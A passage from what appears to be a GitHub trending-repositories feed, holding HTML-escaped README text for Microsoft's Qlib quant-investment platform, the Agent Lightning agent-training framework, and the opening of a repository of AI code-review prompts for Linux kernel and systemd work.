&lt;p&gt;Qlib is high customizable and a lot of its components are learnable. The learnable components are instances of &lt;code&gt;Forecast Model&lt;/code&gt; and &lt;code&gt;Trading Agent&lt;/code&gt;. They are learned based on the &lt;code&gt;Learning Framework&lt;/code&gt; layer and then applied to multiple scenarios in &lt;code&gt;Workflow&lt;/code&gt; layer. The learning framework leverages the &lt;code&gt;Workflow&lt;/code&gt; layer as well(e.g. sharing &lt;code&gt;Information Extractor&lt;/code&gt;, creating environments based on &lt;code&gt;Execution Env&lt;/code&gt;).&lt;/p&gt; 
&lt;p&gt;Based on learning paradigms, they can be categorized into reinforcement learning and supervised learning.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;For supervised learning, the detailed docs can be found &lt;a href="https://qlib.readthedocs.io/en/latest/component/model.html"&gt;here&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;For reinforcement learning, the detailed docs can be found &lt;a href="https://qlib.readthedocs.io/en/latest/component/rl.html"&gt;here&lt;/a&gt;. Qlib's RL learning framework leverages &lt;code&gt;Execution Env&lt;/code&gt; in &lt;code&gt;Workflow&lt;/code&gt; layer to create environments. It's worth noting that &lt;code&gt;NestedExecutor&lt;/code&gt; is supported as well. This empowers users to optimize different level of strategies/models/agents together (e.g. optimizing an order execution strategy for a specific portfolio management strategy).&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;More About Qlib&lt;/h1&gt; 
&lt;p&gt;If you want to have a quick glance at the most frequently used components of qlib, you can try notebooks &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/examples/tutorial/"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;The detailed documents are organized in &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/docs/"&gt;docs&lt;/a&gt;. &lt;a href="http://www.sphinx-doc.org"&gt;Sphinx&lt;/a&gt; and the readthedocs theme is required to build the documentation in html formats.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;cd docs/
conda install sphinx sphinx_rtd_theme -y
# Otherwise, you can install them with pip
# pip install sphinx sphinx_rtd_theme
make html
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You can also view the &lt;a href="http://qlib.readthedocs.io/"&gt;latest document&lt;/a&gt; online directly.&lt;/p&gt; 
&lt;p&gt;Qlib is in active and continuing development. Our plan is in the roadmap, which is managed as a &lt;a href="https://github.com/microsoft/qlib/projects/1"&gt;github project&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;Offline Mode and Online Mode&lt;/h1&gt; 
&lt;p&gt;The data server of Qlib can either deployed as &lt;code&gt;Offline&lt;/code&gt; mode or &lt;code&gt;Online&lt;/code&gt; mode. The default mode is offline mode.&lt;/p&gt; 
&lt;p&gt;Under &lt;code&gt;Offline&lt;/code&gt; mode, the data will be deployed locally.&lt;/p&gt; 
&lt;p&gt;Under &lt;code&gt;Online&lt;/code&gt; mode, the data will be deployed as a shared data service. The data and their cache will be shared by all the clients. The data retrieval performance is expected to be improved due to a higher rate of cache hits. It will consume less disk space, too. The documents of the online mode can be found in &lt;a href="https://qlib-server.readthedocs.io/"&gt;Qlib-Server&lt;/a&gt;. The online mode can be deployed automatically with &lt;a href="https://qlib-server.readthedocs.io/en/latest/build.html#one-click-deployment-in-azure"&gt;Azure CLI based scripts&lt;/a&gt;. The source code of online data server can be found in &lt;a href="https://github.com/microsoft/qlib-server"&gt;Qlib-Server repository&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;Performance of Qlib Data Server&lt;/h2&gt; 
&lt;p&gt;The performance of data processing is important to data-driven methods like AI technologies. As an AI-oriented platform, Qlib provides a solution for data storage and data processing. To demonstrate the performance of Qlib data server, we compare it with several other data storage solutions.&lt;/p&gt; 
&lt;p&gt;We evaluate the performance of several storage solutions by finishing the same task, which creates a dataset (14 features/factors) from the basic OHLCV daily data of a stock market (800 stocks each day from 2007 to 2020). The task involves data queries and processing.&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;&lt;/th&gt; 
   &lt;th&gt;HDF5&lt;/th&gt; 
   &lt;th&gt;MySQL&lt;/th&gt; 
   &lt;th&gt;MongoDB&lt;/th&gt; 
   &lt;th&gt;InfluxDB&lt;/th&gt; 
   &lt;th&gt;Qlib -E -D&lt;/th&gt; 
   &lt;th&gt;Qlib +E -D&lt;/th&gt; 
   &lt;th&gt;Qlib +E +D&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Total (1CPU) (seconds)&lt;/td&gt; 
   &lt;td&gt;184.4¬±3.7&lt;/td&gt; 
   &lt;td&gt;365.3¬±7.5&lt;/td&gt; 
   &lt;td&gt;253.6¬±6.7&lt;/td&gt; 
   &lt;td&gt;368.2¬±3.6&lt;/td&gt; 
   &lt;td&gt;147.0¬±8.8&lt;/td&gt; 
   &lt;td&gt;47.6¬±1.0&lt;/td&gt; 
   &lt;td&gt;&lt;strong&gt;7.4¬±0.3&lt;/strong&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Total (64CPU) (seconds)&lt;/td&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;/td&gt; 
   &lt;td&gt;8.8¬±0.6&lt;/td&gt; 
   &lt;td&gt;&lt;strong&gt;4.2¬±0.2&lt;/strong&gt;&lt;/td&gt; 
   &lt;td&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;+(-)E&lt;/code&gt; indicates with (out) &lt;code&gt;ExpressionCache&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;+(-)D&lt;/code&gt; indicates with (out) &lt;code&gt;DatasetCache&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Most general-purpose databases take too much time to load data. After looking into the underlying implementation, we find that data go through too many layers of interfaces and unnecessary format transformations in general-purpose database solutions. Such overheads greatly slow down the data loading process. Qlib data are stored in a compact format, which is efficient to be combined into arrays for scientific computation.&lt;/p&gt; 
&lt;h1&gt;Related Reports&lt;/h1&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://analyticsindiamag.com/qlib/"&gt;Guide To Qlib: Microsoft‚Äôs AI Investment Platform&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://mp.weixin.qq.com/s/47bP5YwxfTp2uTHjUBzJQQ"&gt;ÂæÆËΩØ‰πüÊêûAIÈáèÂåñÂπ≥Âè∞ÔºüËøòÊòØÂºÄÊ∫êÁöÑÔºÅ&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://mp.weixin.qq.com/s/vsJv7lsgjEi-ALYUz4CvtQ"&gt;ÂæÆÁüøQlibÔºö‰∏öÂÜÖÈ¶ñ‰∏™AIÈáèÂåñÊäïËµÑÂºÄÊ∫êÂπ≥Âè∞&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h1&gt;Contact Us&lt;/h1&gt; 
&lt;ul&gt; 
 &lt;li&gt;If you have any issues, please create issue &lt;a href="https://github.com/microsoft/qlib/issues/new/choose"&gt;here&lt;/a&gt; or send messages in &lt;a href="https://gitter.im/Microsoft/qlib"&gt;gitter&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;If you want to make contributions to &lt;code&gt;Qlib&lt;/code&gt;, please &lt;a href="https://github.com/microsoft/qlib/compare"&gt;create pull requests&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;For other reasons, you are welcome to contact us by email(&lt;a href="mailto:qlib@microsoft.com"&gt;qlib@microsoft.com&lt;/a&gt;). 
  &lt;ul&gt; 
   &lt;li&gt;We are recruiting new members(both FTEs and interns), your resumes are welcome!&lt;/li&gt; 
  &lt;/ul&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Join IM discussion groups:&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;&lt;a href="https://gitter.im/Microsoft/qlib"&gt;Gitter&lt;/a&gt;&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;&lt;img src="https://github.com/microsoft/qlib/raw/main/docs/_static/img/qrcode/gitter_qr.png" alt="image" /&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h1&gt;Contributing&lt;/h1&gt; 
&lt;p&gt;We appreciate all contributions and thank all the contributors! &lt;a href="https://github.com/microsoft/qlib/graphs/contributors"&gt;&lt;img src="https://contrib.rocks/image?repo=microsoft/qlib" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Before we released Qlib as an open-source project on Github in Sep 2020, Qlib is an internal project in our group. Unfortunately, the internal commit history is not kept. A lot of members in our group have also contributed a lot to Qlib, which includes Ruihua Wang, Yinda Zhang, Haisu Yu, Shuyu Wang, Bochen Pang, and &lt;a href="https://github.com/evanzd/evanzd"&gt;Dong Zhou&lt;/a&gt;. Especially thanks to &lt;a href="https://github.com/evanzd/evanzd"&gt;Dong Zhou&lt;/a&gt; due to his initial version of Qlib.&lt;/p&gt; 
&lt;h2&gt;Guidance&lt;/h2&gt; 
&lt;p&gt;This project welcomes contributions and suggestions.&lt;br /&gt; &lt;strong&gt;Here are some &lt;a href="https://raw.githubusercontent.com/microsoft/qlib/main/docs/developer/code_standard_and_dev_guide.rst"&gt;code standards and development guidance&lt;/a&gt; for submiting a pull request.&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Making contributions is not a hard thing. Solving an issue(maybe just answering a question raised in &lt;a href="https://github.com/microsoft/qlib/issues"&gt;issues list&lt;/a&gt; or &lt;a href="https://gitter.im/Microsoft/qlib"&gt;gitter&lt;/a&gt;), fixing/issuing a bug, improving the documents and even fixing a typo are important contributions to Qlib.&lt;/p&gt; 
&lt;p&gt;For example, if you want to contribute to Qlib's document/code, you can follow the steps in the figure below.&lt;/p&gt; 
&lt;p align="center"&gt; &lt;img src="https://github.com/demon143/qlib/raw/main/docs/_static/img/change%20doc.gif" /&gt; &lt;/p&gt; 
&lt;p&gt;If you don't know how to start to contribute, you can refer to the following examples.&lt;/p&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Type&lt;/th&gt; 
   &lt;th&gt;Examples&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Solving issues&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/qlib/issues/749"&gt;Answer a question&lt;/a&gt;; &lt;a href="https://github.com/microsoft/qlib/issues/765"&gt;issuing&lt;/a&gt; or &lt;a href="https://github.com/microsoft/qlib/pull/792"&gt;fixing&lt;/a&gt; a bug&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Docs&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/qlib/pull/797/files"&gt;Improve docs quality&lt;/a&gt; ; &lt;a href="https://github.com/microsoft/qlib/pull/774"&gt;Fix a typo&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Feature&lt;/td&gt; 
   &lt;td&gt;Implement a &lt;a href="https://github.com/microsoft/qlib/projects"&gt;requested feature&lt;/a&gt; like &lt;a href="https://github.com/microsoft/qlib/pull/754"&gt;this&lt;/a&gt;; &lt;a href="https://github.com/microsoft/qlib/pull/539/files"&gt;Refactor interfaces&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Dataset&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/qlib/pull/733"&gt;Add a dataset&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Models&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/qlib/pull/689"&gt;Implement a new model&lt;/a&gt;, &lt;a href="https://github.com/microsoft/qlib/tree/main/examples/benchmarks#contributing"&gt;some instructions to contribute models&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;a href="https://github.com/microsoft/qlib/labels/good%20first%20issue"&gt;Good first issues&lt;/a&gt; are labelled to indicate that they are easy to start your contributions.&lt;/p&gt; 
&lt;p&gt;You can find some impefect implementation in Qlib by &lt;code&gt;rg 'TODO|FIXME' qlib&lt;/code&gt;&lt;/p&gt; 
&lt;p&gt;If you would like to become one of Qlib's maintainers to contribute more (e.g. help merge PR, triage issues), please contact us by email(&lt;a href="mailto:qlib@microsoft.com"&gt;qlib@microsoft.com&lt;/a&gt;). We are glad to help to upgrade your permission.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;p&gt;Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the right to use your contribution. For details, visit &lt;a href="https://cla.opensource.microsoft.com"&gt;https://cla.opensource.microsoft.com&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;When you submit a pull request, a CLA bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt; 
&lt;p&gt;This project has adopted the &lt;a href="https://opensource.microsoft.com/codeofconduct/"&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href="https://opensource.microsoft.com/codeofconduct/faq/"&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href="mailto:opencode@microsoft.com"&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>microsoft/agent-lightning</title>
      <link>https://github.com/microsoft/agent-lightning</link>
      <description>&lt;p&gt;The absolute trainer to light up AI agents.&lt;/p&gt;&lt;hr&gt;&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/microsoft/agent-lightning/main/docs/assets/readme-banner.svg?sanitize=true" alt="Agent-lightning-banner" style="width:600px" /&gt; &lt;/p&gt; 
&lt;h1&gt;Agent Lightning‚ö°&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/badge-unit.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/badge-unit.yml/badge.svg?sanitize=true" alt="Unit Tests" /&gt;&lt;/a&gt; &lt;a href="https://microsoft.github.io/agent-lightning/"&gt;&lt;img src="https://img.shields.io/badge/GitHub%20Pages-Documentation-blue" alt="Documentation" /&gt;&lt;/a&gt; &lt;a href="https://badge.fury.io/py/agentlightning"&gt;&lt;img src="https://badge.fury.io/py/agentlightning.svg?sanitize=true" alt="PyPI version" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/microsoft/agent-lightning/main/LICENSE"&gt;&lt;img src="https://img.shields.io/badge/license-MIT-blue.svg?sanitize=true" alt="License" /&gt;&lt;/a&gt; &lt;a href="https://deepwiki.com/microsoft/agent-lightning"&gt;&lt;img src="https://deepwiki.com/badge.svg?sanitize=true" alt="Ask DeepWiki" /&gt;&lt;/a&gt; &lt;a href="https://discord.gg/RYk7CdvDR7"&gt;&lt;img src="https://img.shields.io/badge/Discord-Join-5865F2?logo=discord&amp;amp;logoColor=white" alt="Discord" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;The absolute trainer to light up AI agents.&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Join our &lt;a href="https://discord.gg/RYk7CdvDR7"&gt;Discord community&lt;/a&gt; to connect with other users and contributors.&lt;/p&gt; 
&lt;h2&gt;‚ö° Core Features&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;Turn your agent into an optimizable beast with &lt;strong&gt;ZERO CODE CHANGE&lt;/strong&gt; (almost)! üí§&lt;/li&gt; 
 &lt;li&gt;Build with &lt;strong&gt;ANY&lt;/strong&gt; agent framework (LangChain, OpenAI Agent SDK, AutoGen, CrewAI, Microsoft Agent Framework...); or even WITHOUT agent framework (Python OpenAI). You name it! ü§ñ&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Selectively&lt;/strong&gt; optimize one or more agents in a multi-agent system. üéØ&lt;/li&gt; 
 &lt;li&gt;Embraces &lt;strong&gt;Algorithms&lt;/strong&gt; like Reinforcement Learning, Automatic Prompt Optimization, Supervised Fine-tuning and more. ü§ó&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Read more on our &lt;a href="https://microsoft.github.io/agent-lightning/"&gt;documentation website&lt;/a&gt;.&lt;/p&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/microsoft/agent-lightning/main/docs/assets/readme-diff.svg?sanitize=true" alt="Agent-Lightning Core Quickstart" style="width:100%" /&gt; &lt;/p&gt; 
&lt;h2&gt;‚ö° Installation&lt;/h2&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip install agentlightning
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For the latest nightly build (cutting-edge features), you can install from Test PyPI:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip install --upgrade --index-url https://test.pypi.org/simple/ --extra-index-url https://pypi.org/simple/ --pre agentlightning
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Please refer to our &lt;a href="https://microsoft.github.io/agent-lightning/stable/tutorials/installation/"&gt;installation guide&lt;/a&gt; for more details.&lt;/p&gt; 
&lt;p&gt;To start using Agent-lightning, check out our &lt;a href="https://microsoft.github.io/agent-lightning/"&gt;documentation&lt;/a&gt; and &lt;a href="https://raw.githubusercontent.com/microsoft/agent-lightning/main/examples"&gt;examples&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;‚ö° Articles&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;12/17/2025 &lt;a href="https://agent-lightning.github.io/posts/trajectory_level_aggregation/"&gt;Adopting the Trajectory Level Aggregation for Faster Training&lt;/a&gt; Agent-lightning blog.&lt;/li&gt; 
 &lt;li&gt;11/4/2025 &lt;a href="https://medium.com/@yugez/tuning-any-ai-agent-with-tinker-agent-lightning-part-1-1d8c9a397f0e"&gt;Tuning ANY AI agent with Tinker ‚úï Agent-lightning&lt;/a&gt; Medium. See also &lt;a href="https://medium.com/@yugez/tuning-any-ai-agent-with-tinker-agent-lightning-part-2-332c5437f0dc"&gt;Part 2&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;10/22/2025 &lt;a href="https://blog.vllm.ai/2025/10/22/agent-lightning.html"&gt;No More Retokenization Drift: Returning Token IDs via the OpenAI Compatible API Matters in Agent RL&lt;/a&gt; vLLM blog. See also &lt;a href="https://zhuanlan.zhihu.com/p/1965067274642785725"&gt;Zhihu writeup&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;8/11/2025 &lt;a href="https://medium.com/@yugez/training-ai-agents-to-write-and-self-correct-sql-with-reinforcement-learning-571ed31281ad"&gt;Training AI Agents to Write and Self-correct SQL with Reinforcement Learning&lt;/a&gt; Medium.&lt;/li&gt; 
 &lt;li&gt;8/5/2025 &lt;a href="https://arxiv.org/abs/2508.03680"&gt;Agent Lightning: Train ANY AI Agents with Reinforcement Learning&lt;/a&gt; arXiv paper.&lt;/li&gt; 
 &lt;li&gt;7/26/2025 &lt;a href="https://www.reddit.com/r/LocalLLaMA/comments/1m9m670/we_discovered_an_approach_to_train_any_ai_agent/"&gt;We discovered an approach to train any AI agent with RL, with (almost) zero code changes.&lt;/a&gt; Reddit.&lt;/li&gt; 
 &lt;li&gt;6/6/2025 &lt;a href="https://www.microsoft.com/en-us/research/project/agent-lightning/"&gt;Agent Lightning - Microsoft Research&lt;/a&gt; Project page.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;‚ö° Community Projects&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://github.com/af-74413592/DeepWerewolf"&gt;DeepWerewolf&lt;/a&gt; ‚Äî A case study of agent RL training for the Chinese Werewolf game built with AgentScope and Agent Lightning.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://agentflow.stanford.edu/"&gt;AgentFlow&lt;/a&gt; ‚Äî A modular multi-agent framework that combines planner, executor, verifier, and generator agents with the Flow-GRPO algorithm to tackle long-horizon, sparse-reward tasks.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/TencentCloudADP/Youtu-agent"&gt;Youtu-Agent&lt;/a&gt; ‚Äî Youtu-Agent lets you build and train your agent with ease. Built with &lt;a href="https://github.com/microsoft/agent-lightning/tree/contrib/youtu-agent-lightning"&gt;a modified branch&lt;/a&gt; of Agent Lightning, Youtu-Agent has verified up to 128 GPUs RL training on maths/code and search capabilities with steady convergence. Also check &lt;a href="https://github.com/TencentCloudADP/youtu-agent/tree/rl/agl"&gt;the recipe&lt;/a&gt; and their blog &lt;a href="https://spotted-coconut-df8.notion.site/Stop-Wrestling-with-Your-Agent-RL-How-Youtu-Agent-Achieved-Stable-128-GPU-Scaling-Without-Breaking-2ca5e8f089ba80539a98c582b65e0233"&gt;&lt;em&gt;Stop Wrestling with Your Agent RL: How Youtu-Agent Achieved Stable, 128-GPU Scaling Without Breaking a Sweat&lt;/em&gt;&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;‚ö° Architecture&lt;/h2&gt; 
&lt;p&gt;Agent Lightning keeps the moving parts to a minimum so you can focus on your idea, not the plumbing. Your agent continues to run as usual; you can still use any agent framework you like; you drop in the lightweight &lt;code&gt;agl.emit_xxx()&lt;/code&gt; helper, or let the tracer collect every prompt, tool call, and reward. Those events become structured spans that flow into the LightningStore, a central hub that keeps tasks, resources, and traces in sync.&lt;/p&gt; 
&lt;p&gt;On the other side of the store sits the algorithm you choose, or write yourself. The algorithm reads spans, learns from them, and posts updated resources such as refined prompt templates or new policy weights. The Trainer ties it all together: it streams datasets to runners, ferries resources between the store and the algorithm, and updates the inference engine when improvements land. You can either stop there, or simply let the same loop keep turning.&lt;/p&gt; 
&lt;p&gt;No rewrites, no lock-in, just a clear path from first rollout to steady improvement.&lt;/p&gt; 
&lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/microsoft/agent-lightning/main/docs/assets/readme-architecture.svg?sanitize=true" alt="Agent-lightning Architecture" style="width:100%" /&gt; &lt;/p&gt; 
&lt;h2&gt;‚ö° CI Status&lt;/h2&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th&gt;Workflow&lt;/th&gt; 
   &lt;th&gt;Status&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td&gt;CPU Tests&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/tests.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/tests.yml/badge.svg?sanitize=true" alt="tests workflow status" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Full Tests&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/badge-unit.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/badge-unit.yml/badge.svg?sanitize=true" alt="tests summary workflow status" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;UI Tests&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/dashboard.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/dashboard.yml/badge.svg?sanitize=true" alt="UI Tests" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Examples Integration&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/badge-examples.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/badge-examples.yml/badge.svg?sanitize=true" alt="examples summary workflow status" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Latest Dependency Compatibility&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/badge-latest.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/badge-latest.yml/badge.svg?sanitize=true" alt="latest summary workflow status" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td&gt;Legacy Examples Compatibility&lt;/td&gt; 
   &lt;td&gt;&lt;a href="https://github.com/microsoft/agent-lightning/actions/workflows/badge-compat.yml"&gt;&lt;img src="https://github.com/microsoft/agent-lightning/actions/workflows/badge-compat.yml/badge.svg?sanitize=true" alt="compat summary workflow status" /&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;h2&gt;‚ö° Citation&lt;/h2&gt; 
&lt;p&gt;If you find Agent Lightning useful in your research or projects, please cite our paper:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bibtex"&gt;@misc{luo2025agentlightningtrainai,
      title={Agent Lightning: Train ANY AI Agents with Reinforcement Learning},
      author={Xufang Luo and Yuge Zhang and Zhiyuan He and Zilong Wang and Siyun Zhao and Dongsheng Li and Luna K. Qiu and Yuqing Yang},
      year={2025},
      eprint={2508.03680},
      archivePrefix={arXiv},
      primaryClass={cs.AI},
      url={https://arxiv.org/abs/2508.03680},
}
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;‚ö° Contributing&lt;/h2&gt; 
&lt;p&gt;This project welcomes contributions and suggestions. Start by reading the &lt;a href="https://raw.githubusercontent.com/microsoft/agent-lightning/main/docs/community/contributing.md"&gt;Contributing Guide&lt;/a&gt; for recommended contribution points, environment setup, branching conventions, and pull request expectations. Most contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit &lt;a href="https://cla.opensource.microsoft.com"&gt;https://cla.opensource.microsoft.com&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;When you submit a pull request, a CLA bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repos using our CLA.&lt;/p&gt; 
&lt;p&gt;This project has adopted the &lt;a href="https://opensource.microsoft.com/codeofconduct/"&gt;Microsoft Open Source Code of Conduct&lt;/a&gt;. For more information see the &lt;a href="https://opensource.microsoft.com/codeofconduct/faq/"&gt;Code of Conduct FAQ&lt;/a&gt; or contact &lt;a href="mailto:opencode@microsoft.com"&gt;opencode@microsoft.com&lt;/a&gt; with any additional questions or comments.&lt;/p&gt; 
&lt;h2&gt;‚ö° Trademarks&lt;/h2&gt; 
&lt;p&gt;This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft trademarks or logos is subject to and must follow &lt;a href="https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general"&gt;Microsoft's Trademark &amp;amp; Brand Guidelines&lt;/a&gt;. Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship. Any use of third-party trademarks or logos are subject to those third-party's policies.&lt;/p&gt; 
&lt;h2&gt;‚ö° Responsible AI&lt;/h2&gt; 
&lt;p&gt;This project has been evaluated and certified to comply with the Microsoft Responsible AI Standard. The team will continue to monitor and maintain the repository, addressing any severe issues, including potential harms, if they arise.&lt;/p&gt; 
&lt;h2&gt;‚ö° License&lt;/h2&gt; 
&lt;p&gt;This project is licensed under the MIT License. See the &lt;a href="https://raw.githubusercontent.com/microsoft/agent-lightning/main/LICENSE"&gt;LICENSE&lt;/a&gt; file for details.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>masoncl/review-prompts</title>
      <link>https://github.com/masoncl/review-prompts</link>
      <description>&lt;p&gt;AI review prompts&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Review Prompts for AI-Assisted Code Review&lt;/h1&gt; 
&lt;p&gt;AI-assisted code review prompts for Linux kernel and systemd development. Works with Claude Code and other AI tools.&lt;/p&gt; 
&lt;h2&gt;Quick Start&lt;/h2&gt; 
&lt;h3&gt;Install Kernel Prompts Only&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;cd kernel/scripts
./claude-setup.sh
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Install systemd Prompts Only&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;cd systemd/scripts
./claude-setup.sh
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Install Both&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;cd kernel/scripts &amp;amp;&amp;amp; ./claude-setup.sh
cd ../systemd/scripts &amp;amp;&amp;amp; ./claude-setup.sh
&lt;/code&gt;&lt;/pre&gt; 
